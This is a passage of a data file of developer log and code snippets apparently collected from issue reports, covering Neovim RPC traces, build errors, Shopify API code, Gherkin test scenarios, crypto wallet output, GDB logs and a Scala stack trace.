[#msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x1253eb17 \"[B@1253eb17\"]}]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result 2, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [1 0], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 2, :method :nvim-buf-clear-namespace, :params [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x7dc6aec \"[B@7dc6aec\"]} 2 0 -1]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 2, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_clear_namespace\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 2 0 -1]] [\"nvim_buf_set_virtual_text\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x53da95bb \"[B@53da95bb\"]} 2 0 [[\"@> Assessing :pfig\" \"comment\"]] {}]])]}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[nil 2] nil], :client :stdio}\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.prepl:151] - Fetching current deps.\r\n20-04-08 19:49:44 arch-desktop TRACE [conjure.prepl:68] - Read from remote-prepl :pfig - {:tag :out, :val \"Open URL http://localhost:9500\\n\", :form nil}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :quick-doc, :params [0], :client :stdio}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}, :client :stdio}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x2b7a4451 \"[B@2b7a4451\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:49:45 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/home/colin/projects/aok-elo-graph-front-end/src/aok_elo_graph_front_end/core.cljs\" 42 [\"(ns ^:figwheel-hooks aok-elo-graph-front-end.core\" \"  (:require\" \"   [goog.dom :as gdom]\" \"   [reagent.core :as reagent :refer [atom]]))\" \"\" \"(println \\\"This text is printed from src/aok_elo_graph_front_end/core.cljs. Go ahead and edit it and see reloading in action.\\\")\" \"\" \"(defn multiply [a b] (* a b))\" \"\" \"\" \";; define your app data so that it doesn't get over-written on reload\" \"(defonce app-state (atom {:text \\\"cats\\\"}))\" \"\" \"(defn get-app-element []\" \"  (gdom/getElement \\\"app\\\"))\" \"\" \"(defn hello-world []\" \"  [:div\" \"   [:h1 (:text @app-state)]\" \"   [:h3 \\\"Edit this in src/aok_elo_graph_front_end/core.cljs and watch it change!\\\"]])\" \"\" \"(defn mount [el]\" \"  (reagent/render-component [hello-world] el))\" \"\" \"(defn mount-app-element []\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x49b45589 \"[B@49b45589\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n[Truncated]\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}, :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[\"/tmp/conjure.cljc\" 2 [\"; conjure/out | Welcome to Conjure! (v2.1.2-2-gd3356a4de4)\" \"; conjure/up | Adding :pfig\"] #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x24f3e46b \"[B@24f3e46b\"]} \"/home/colin/projects/aok-elo-graph-front-end\"] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop WARN [conjure.util:76] - Failed to parse code clojure.lang.ExceptionInfo: EOF while reading. {:type :reader-exception, :ex-kind :eof}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_get_current_buf\" []] [\"nvim_get_current_win\" []] [\"nvim_eval\" [\"matchstr(getline('.'), '\\\\%'.col('.').'c.')\"]] [\"nvim_call_function\" [\"searchpairpos\" (\"(\" \"\" \")\" \"bnzW\" \"!conjure#cursor_in_code()\")]] [\"nvim_call_function\" [\"searchpairpos\" (\"(\" \"\" \")\" \"nzW\" \"!conjure#cursor_in_code()\")]])]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x62ded372 \"[B@62ded372\"]} #msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x57d0709b \"[B@57d0709b\"]} \";\" [0 0] [0 0]] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-win-get-cursor, :params [#msgpack.core.Ext{:type 1, :data #object[\"[B\" 0x57d0709b \"[B@57d0709b\"]}]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [2 0], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [()]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result [[] nil], :client :stdio}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-buf-clear-namespace, :params [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0x17d81cf9 \"[B@17d81cf9\"]} 2 0 -1]}\r\n20-04-08 19:50:02 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result nil, :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :notify, :method :stop, :params [0], :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-get-current-buf, :params nil}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:175] - Received RPC message: {:type :response, :id 1, :error nil, :result #msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}, :client :stdio}\r\n20-04-08 19:50:04 arch-desktop TRACE [conjure.rpc:163] - Sending RPC message: {:type :request, :client :stdio, :id 1, :method :nvim-call-atomic, :params [([\"nvim_buf_get_name\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}]] [\"nvim_buf_line_count\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]}]] [\"nvim_buf_get_lines\" [#msgpack.core.Ext{:type 0, :data #object[\"[B\" 0xb8814c \"[B@b8814c\"]} 0 25 false]] [\"nvim_get_current_win\" []] [\"nvim_call_function\" [\"getcwd\" (0)]])]}\r\n20-04-08 19:50:04 arch-desktop INFO [conjure.main:21] - Shutting down\r\n20-04-08 19:50:04 arch-desktop ERROR [conjure.rpc:?] - Error from thread 'RPC stdin handler': java.io.EOFException\r\n\r\n"
    },
    {
        "logs": "`,\r\n  method: 'GET',\r\n  headers: shopifyConfig,\r\n}).catch(\r\n  function (error) {\r\n    console.info('This Product is not in the sales channel for this app!', error)\r\n\r\n    return res\r\n        \r\n       \r\n  }\r\n)\r\nconsole.log('Checking sales channel sync data...', id)\r\n\r\n\r\n // Check Channel found\r\n if (!shopifyChannelProduct) {\r\n  console.warn('NOT HERE')\r\n  return res\r\n   \r\n  \r\n  // No changes found\r\n} else {\r\n  console.info('Product is here continue to sync.')\r\n  "
    },
    {
        "logs": "`,\r\n  method: 'GET',\r\n  headers: shopifyConfig,\r\n}).catch(\r\n  function (error) {\r\n    console.info('This Product is not in the sales channel for this app!', error)\r\n\r\n    return res\r\n        \r\n       \r\n  }\r\n)\r\nconsole.log('Checking sales channel sync data...', id)\r\n\r\n\r\n // Check Channel found\r\n if (!shopifyChannelProduct) {\r\n  console.warn('NOT HERE')\r\n  return res\r\n   \r\n  \r\n  // No changes found\r\n} else {\r\n  console.info('Product is here continue to sync.')\r\n  \r\n}\r\n"
    },
    {
        "logs": "```js\r\n// Check if the product exists in the channel\r\nconst shopifyChannelProduct = await axios({\r\n  url: `https://${process.env.SHOPIFY_STORE_ID}.myshopify.com/admin/product_listings/${id}.json`,\r\n  method: 'GET',\r\n  headers: shopifyConfig,\r\n}).catch(\r\n  function (error) {\r\n    console.info('This Product is not in the sales channel for this app!', error)\r\n\r\n    return res\r\n        \r\n       \r\n  }\r\n)\r\nconsole.log('Checking sales channel sync data...', id)\r\n\r\n\r\n // Check Channel found\r\n if (!shopifyChannelProduct) {\r\n  console.warn('NOT HERE')\r\n  return res\r\n   \r\n  \r\n  // No changes found\r\n} else {\r\n  console.info('Product is here continue to sync.')\r\n  \r\n}\r\n"
    },
    {
        "logs": "`\r\nbrew install valet-php@7.4.rb  --build-from-source\r\nUpdating Homebrew...\r\n==> Auto-updated Homebrew!\r\nUpdated 3 taps (homebrew/core, homebrew/cask and homebrew/services).\r\n==> New Formulae\r\nlibrist                 osc-cli                 selene                  solana                  vespa-cli\r\n==> Updated Formulae\r\nUpdated 362 formulae.\r\n==> New Casks\r\nepilogue-operator             mathcha-notebook              nimblenote                    remotion\r\n==> Updated Casks\r\nUpdated 158 casks.\r\n\r\nError: valet-php@7.4: /Users/username_3/valet-php@7.4.rb:7: syntax error, unexpected '<'\r\n<!DOCTYPE html>\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected '<'\r\n<html lang=\"en\" data-color-mod...\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected tIDENTIFIER, expecting end-of-input\r\n<html lang=\"en\" data-color-mode=\"auto\" data-light...\r\n                ^~~~\r\n\r\n"
    },
    {
        "logs": "```\r\nbrew install valet-php@7.4.rb  --build-from-source\r\nUpdating Homebrew...\r\n==> Auto-updated Homebrew!\r\nUpdated 3 taps (homebrew/core, homebrew/cask and homebrew/services).\r\n==> New Formulae\r\nlibrist                 osc-cli                 selene                  solana                  vespa-cli\r\n==> Updated Formulae\r\nUpdated 362 formulae.\r\n==> New Casks\r\nepilogue-operator             mathcha-notebook              nimblenote                    remotion\r\n==> Updated Casks\r\nUpdated 158 casks.\r\n\r\nError: valet-php@7.4: /Users/username_3/valet-php@7.4.rb:7: syntax error, unexpected '<'\r\n<!DOCTYPE html>\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected '<'\r\n<html lang=\"en\" data-color-mod...\r\n^\r\n/Users/username_3/valet-php@7.4.rb:8: syntax error, unexpected tIDENTIFIER, expecting end-of-input\r\n<html lang=\"en\" data-color-mode=\"auto\" data-light...\r\n                ^~~~\r\n\r\n"
    },
    {
        "logs": "`\r\nninja: error: 'stdlib/private/OSLog/swift_Concurrency-swiftmodule-macosx-arm64', needed by 'stdlib/private/OSLog/OSX/arm64/OSLogTestHelper.o', missing and no known rule to make it\r\n"
    },
    {
        "logs": "```\r\nninja: error: 'stdlib/private/OSLog/swift_Concurrency-swiftmodule-macosx-arm64', needed by 'stdlib/private/OSLog/OSX/arm64/OSLogTestHelper.o', missing and no known rule to make it\r\n"
    },
    {
        "logs": "` Gherkin\r\nScenario 1: Tokens with 0 recommended decimal places\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token\r\n\r\nScenario 2: Tokens with 0 recommended decimal places with altered settings\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to  > 0\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"You are not using recommended decimal place configuration for this native token\"\r\n\r\nScenario 3: Tokens with non zero ( > 0) recommended decimal places\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"The recommended value for decimal place configuration for this native token is X decimal places\"\r\n\r\nScenario 4: Tokens with non zero ( > 0) recommended decimal places with altered settings to recommended\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to the recommended\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token\r\n"
    },
    {
        "logs": "``` Gherkin\r\nScenario 1: Tokens with 0 recommended decimal places\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token\r\n\r\nScenario 2: Tokens with 0 recommended decimal places with altered settings\r\nGiven I have tokens with 0 recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to  > 0\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"You are not using recommended decimal place configuration for this native token\"\r\n\r\nScenario 3: Tokens with non zero ( > 0) recommended decimal places\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd I haven't altered any settings\r\nWhen I navigate to Summary -> Tokens\r\nThen there is a warning icon shown next to the token\r\nAnd upon hovering the tooltip displays \r\n\"The recommended value for decimal place configuration for this native token is X decimal places\"\r\n\r\nScenario 4: Tokens with non zero ( > 0) recommended decimal places with altered settings to recommended\r\nGiven I have tokens with non zero ( > 0) recommended decimal places\r\nAnd in Settings, I have saved the number of decimal places to the recommended\r\nWhen I navigate to Summary -> Tokens\r\nThen there is no warning icon shown next to the token\r\n"
    },
    {
        "logs": "`{\r\n    \"code\": 770,\r\n    \"message\": \"Operation failed\",\r\n    \"retriable\": false,\r\n    \"details\": {\r\n        \"operations\": [\r\n            {\r\n                \"amount\": {\r\n                    \"e8s\": 100000\r\n                },\r\n                \"fee\": {\r\n                    \"e8s\": 10000\r\n                },\r\n                \"from\": \"89a472bb2badae8d062e28901c8b6af57ec1352649e4a0f6e755ec4ea56c2d4e\",\r\n                \"response\": {\r\n                    \"code\": 740,\r\n                    \"details\": {\r\n                        \"error_message\": \"Failed to authenticate request 0xe1504898ca77b896bd262859d12a5ddba917a51c6fba6e74a367e9b8fc7b359d due to: Invalid signature: Invalid basic signature: Ed25519 signature could not be verified: public key 214646b3fdff4371282fb9c7dc90ba39d54e953dcc7353f34a9bf7e4ab8e91a9, signature 194e2302013444b4873c0f94c7c4b40d0f46a3709aaf8b51100e83c844953cb485f132e78d5790c2a3ba1b3579beb150974ebe7b371816d7f9d8ba4114738407, error: signature error\",\r\n                        \"ic_http_status\": 403\r\n                    },\r\n                    \"message\": \"Internet Computer error\",\r\n                    \"retriable\": false\r\n                },\r\n                \"status\": \"FAILED\",\r\n                \"to\": \"6499d6b24ce488c263cb7aba350249f73d81d6e1caa4fb6fae09d8b3e3f91846\",\r\n                \"transaction_identifier\": {\r\n                    \"hash\": \"d5e2577ce5c7766375fc9894f0e1622ce0a6478003c10c61fc6f2054466f840a\"\r\n                },\r\n                \"type\": \"TRANSACTION\"\r\n            }\r\n        ]\r\n    }\r\n}"
    },
    {
        "logs": "`\r\n[wallet 9xLMUj]: incoming_transfers available\r\n               amount   spent    unlocked  ringct    global index                                                               tx id      addr index\r\n       0.021846280000       F    unlocked  RingCT          326479  <25cebe40f22757a9284448013564110c785432d8a6111bd76594ab01043a37ad>               0\r\n       0.024081800000       F    unlocked  RingCT          326998  <10810ca2bba18f8bf3287fea5ddb11f88f0135296f28baf07e2615505c530786>               0\r\n       0.010000000000       F    unlocked  RingCT          330773  <3ca10a03457ffa1c5a4fe1ee531b6bbbef13ca9a13a44b1acc53425a8ae0c3a6>               0\r\n       0.071060800000       F    unlocked  RingCT          331324  <99db5d8a48ba549644f37850cbf03e2353fa5248b422a0074d0cb009e0b93e3d>               0\r\n      12.151529932305       F    unlocked  RingCT          334738  <024bcd32f3866285437ea96ddc5c5ca484ada14dbe964f259bf4403b8a4b4c8d>               0\r\n       0.100000000000       F    unlocked  RingCT          334829  <eae1eaefbe88ddc1830446929eff12249df8197a92e0778c0c9b2b397691de16>               3\r\n      15.844230600000       F    unlocked  RingCT          342292  <2c81dc2ff995c1901056ce8d225a9d2849e7e7bc24e25ebb2998e0180ee4113c>               0\r\n       0.030786040000       F    unlocked  RingCT          345133  <e5f749147e5bcad21064c6f6d2339138d89397eff83945787adec4ea166af310>               0\r\n\r\n[wallet 9xLMUj]: sweep_below 0.025 9xLMUjRpNfEQLoYwogkmiBg9H6XP18mJ3UJphkvhWo9SB3vwbJFSryNfVz6vJFigYwLadki17xHQG7qsxQnnZPuPC1XvpHq\r\nError: Not enough money in unlocked balance\r\n"
    },
    {
        "logs": "```\r\n[wallet 9xLMUj]: incoming_transfers available\r\n               amount   spent    unlocked  ringct    global index                                                               tx id      addr index\r\n       0.021846280000       F    unlocked  RingCT          326479  <25cebe40f22757a9284448013564110c785432d8a6111bd76594ab01043a37ad>               0\r\n       0.024081800000       F    unlocked  RingCT          326998  <10810ca2bba18f8bf3287fea5ddb11f88f0135296f28baf07e2615505c530786>               0\r\n       0.010000000000       F    unlocked  RingCT          330773  <3ca10a03457ffa1c5a4fe1ee531b6bbbef13ca9a13a44b1acc53425a8ae0c3a6>               0\r\n       0.071060800000       F    unlocked  RingCT          331324  <99db5d8a48ba549644f37850cbf03e2353fa5248b422a0074d0cb009e0b93e3d>               0\r\n      12.151529932305       F    unlocked  RingCT          334738  <024bcd32f3866285437ea96ddc5c5ca484ada14dbe964f259bf4403b8a4b4c8d>               0\r\n       0.100000000000       F    unlocked  RingCT          334829  <eae1eaefbe88ddc1830446929eff12249df8197a92e0778c0c9b2b397691de16>               3\r\n      15.844230600000       F    unlocked  RingCT          342292  <2c81dc2ff995c1901056ce8d225a9d2849e7e7bc24e25ebb2998e0180ee4113c>               0\r\n       0.030786040000       F    unlocked  RingCT          345133  <e5f749147e5bcad21064c6f6d2339138d89397eff83945787adec4ea166af310>               0\r\n\r\n[wallet 9xLMUj]: sweep_below 0.025 9xLMUjRpNfEQLoYwogkmiBg9H6XP18mJ3UJphkvhWo9SB3vwbJFSryNfVz6vJFigYwLadki17xHQG7qsxQnnZPuPC1XvpHq\r\nError: Not enough money in unlocked balance\r\n"
    },
    {
        "logs": "`\r\n\r\n\r\n @vsimko @username_1<issue_closed>\n<issue_comment>username_2: +          method = \"color\", tl.pos = \"td\", tl.cex = 0.5, \r\n+          diag = FALSE, p.mat = p_mat, sig.level = 0.01) \r\nWarning message:\r\nIn corrplot(set_cor, type = \"upper\", order = \"FPC\", method = \"color\",  :\r\n  p.mat and corr may be not paired, their rownames and colnames are not totally same!\r\n"
    },
    {
        "logs": "```\r\n\r\n\r\n @vsimko @username_1<issue_closed>\n<issue_comment>username_2: +          method = \"color\", tl.pos = \"td\", tl.cex = 0.5, \r\n+          diag = FALSE, p.mat = p_mat, sig.level = 0.01) \r\nWarning message:\r\nIn corrplot(set_cor, type = \"upper\", order = \"FPC\", method = \"color\",  :\r\n  p.mat and corr may be not paired, their rownames and colnames are not totally same!\r\n"
    },
    {
        "logs": "`js\r\nfunction getBoundingClientRect(element) {\r\n   try {\r\n     return element.getBoundingClientRect();\r\n  } catch(e) {\r\n   if (typoof e === 'object' && e !==nuill && /* check the e is the exception we expect */) {\r\n      return { top: 0, bottom: 0, left: 0, width: 0, height: 0, right: 0 }; \r\n  } else {\r\n    throw e; // something else went wrong, and we must surface the error\r\n  }\r\n}\r\n"
    },
    {
        "logs": "`\r\nconst event = document.createEvent('HTMLEvents');\r\nevent.initEvent('change', true, false);\r\nselect.dispatchEvent(event);\r\n"
    },
    {
        "logs": "```\r\nconst event = document.createEvent('HTMLEvents');\r\nevent.initEvent('change', true, false);\r\nselect.dispatchEvent(event);\r\n"
    },
    {
        "logs": "`Please check OUTPUT tab (Adapter Output) for log of C:/Program Files (x86)/SEGGER/JLink/JLinkGDBServer.exe\r\nLaunching server: \"C:/Program Files (x86)/SEGGER/JLink/JLinkGDBServer.exe\" \"-if\" \"jtag\" \"-port\" \"50000\" \"-swoport\" \"50001\" \"-telnetport\" \"50002\" \"-device\" \"cortex-a7\"\r\n1-gdb-set target-async on\r\n2-interpreter-exec console \"source c:/Users/SESA548172/.vscode/extensions/marus25.cortex-debug-0.3.1/support/gdbsupport.init\"\r\n3-target-select extended-remote localhost:50000\r\n4-interpreter-exec console \"monitor halt\"\r\n5-interpreter-exec console \"monitor reset\"\r\n6-target-download\r\n7-interpreter-exec console \"monitor reset\"\r\n8-enable-pretty-printing\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"notify\",\"asyncClass\":\"thread-group-added\",\"output\":[[\"id\",\"i1\"]]}]}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"Reading symbols from C:\\\\dev/iron-sparrow/app/sumx.elf...\"}]}\r\nReading symbols from C:\\dev/iron-sparrow/app/sumx.elf...\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"done.\\n\"}]}\r\ndone.\r\nGDB -> App: {\"token\":1,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"done\",\"results\":[]}}\r\nGDB -> App: {\"token\":2,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"done\",\"results\":[]}}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"notify\",\"asyncClass\":\"thread-group-started\",\"output\":[[\"id\",\"i1\"],[\"pid\",\"42000\"]]}]}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"notify\",\"asyncClass\":\"thread-created\",\"output\":[[\"id\",\"1\"],[\"group-id\",\"i1\"]]}]}\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"wdog_trigger () at ../aos/aos/wdog.c:102\\n\"}]}\r\nwdog_trigger () at ../aos/aos/wdog.c:102\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"console\",\"content\":\"102\\t    for (;;);\\n\"}]}\r\n102\t    for (;;);\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":false,\"type\":\"exec\",\"asyncClass\":\"stopped\",\"output\":[[\"frame\",[[\"addr\",\"0x801b41be\"],[\"func\",\"wdog_trigger\"],[\"args\",[]]]],[\"file\",\"../aos/aos/wdog.c\"],[\"fullname\",\"C:\\\\dev\\\\iron-sparrow\\\\aos\\\\aos\\\\wdog.c\"],[\"line\",\"102\"]]}]}\r\nNot implemented stop reason (assuming exception): undefined\r\nGDB -> App: {\"token\":3,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"connected\",\"results\":[]}}\r\nGDB -> App: {\"token\":4,\"outOfBandRecord\":[],\"resultRecords\":{\"resultClass\":\"done\",\"results\":[]}}\r\n9-thread-list-ids\r\n10-thread-list-ids\r\nGDB -> App: {\"outOfBandRecord\":[{\"isStream\":true,\"type\":\"target\",\"content\":\"Resetting target\\r\\n\"}]}\r\n"
    },
    {
        "logs": "`ts\r\nclass Http { }\r\n\r\n@Injectable()\r\nclass Service {\r\n  constructor(\r\n    private http: Http,\r\n    @Inject(CONFIG_TOKEN) private config: Config // this cause the resolve error (see bellow)\r\n  ) { }\r\n}\r\n\r\ninterface Config {\r\n  api: string\r\n}\r\nconst config: Config = {\r\n  api: 'api/v1'\r\n}\r\n\r\nconst CONFIG_TOKEN = new InjectionToken<Config>('CONFIG_TOKEN')\r\n"
    },
    {
        "logs": "`\r\nError: Cannot resolve all parameters for 'Service'(Http, @Inject). Make sure that all the parameters are decorated with Inject or have valid type annotations and that 'Service' is decorated with Injectable.\r\n"
    },
    {
        "logs": "`\r\nException occured while processing /export/timesheet/-31\r\nMessage: java.lang.NullPointerException\r\n\tjava.io.ByteArrayInputStream.<init>(ByteArrayInputStream.java:106)\r\n\tcode.export.ExcelExport$.exportTimesheet(ExcelExport.scala:94)\r\n\tbootstrap.liftweb.Boot$$anonfun$boot$3$$anonfun$applyOrElse$1.apply(Boot.scala:197)\r\n\tbootstrap.liftweb.Boot$$anonfun$boot$3$$anonfun$applyOrElse$1.apply(Boot.scala:191)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$liftedTree1$1$1.apply(LiftServlet.scala:485)\r\n\tnet.liftweb.http.LiftServlet$$anonfun$liftedTree1$1$1.apply(LiftServlet.scala:485)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.functionLifespan(S.scala:1833)\r\n\tnet.liftweb.http.S$.functionLifespan(S.scala:47)\r\n\tnet.liftweb.http.LiftServlet.liftedTree1$1(LiftServlet.scala:484)\r\n\tnet.liftweb.http.LiftServlet.net$liftweb$http$LiftServlet$$dispatchStatefulRequest(LiftServlet.scala:472)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$$anonfun$doSession$1$1.apply(LiftServlet.scala:385)\r\n\tnet.liftweb.http.LiftServlet$StatefulResponse$$anonfun$doSession$1$1.apply(LiftServlet.scala:385)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$wrapQuery(S.scala:1562)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_nest2InnerInit$1$$anonfun$apply$40.apply(S.scala:1718)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$doAround(S.scala:1491)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$doAround$1.apply(S.scala:1492)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1(DB.scala:235)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15$$anonfun$net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1$1.apply(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15$$anonfun$net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1$1.apply(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anonfun$use$1.apply(DB.scala:684)\r\n\tnet.liftweb.util.DynoVar$class.run(ThreadGlobal.scala:95)\r\n\tnet.liftweb.db.DB$currentConn$.run(DB.scala:669)\r\n\tnet.liftweb.db.DB$class.use(DB.scala:681)\r\n\tnet.liftweb.db.DB$$anon$1.use(DB.scala:40)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.net$liftweb$db$DB$class$$anon$$anonfun$$recurseMe$1(DB.scala:251)\r\n\tnet.liftweb.db.DB$$anon$2$$anonfun$apply$15.apply(DB.scala:253)\r\n\tnet.liftweb.util.DynoVar$class.run(ThreadGlobal.scala:95)\r\n\tnet.liftweb.db.DB$$anon$2$DepthCnt$.run(DB.scala:224)\r\n\tnet.liftweb.db.DB$$anon$2.apply(DB.scala:227)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$doAround(S.scala:1492)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_nest2InnerInit$1.apply(S.scala:1716)\r\n\tnet.liftweb.util.ThreadGlobal.doWith(ThreadGlobal.scala:71)\r\n\tnet.liftweb.http.S$class.net$liftweb$http$S$$_nest2InnerInit(S.scala:1715)\r\n\tnet.liftweb.http.S$$anonfun$net$liftweb$http$S$$_innerInit$1$$anonfun$apply$44$$anonfun$apply$45$$anonfun$apply$46$$anonfun$apply$47.apply(S.scala:1762)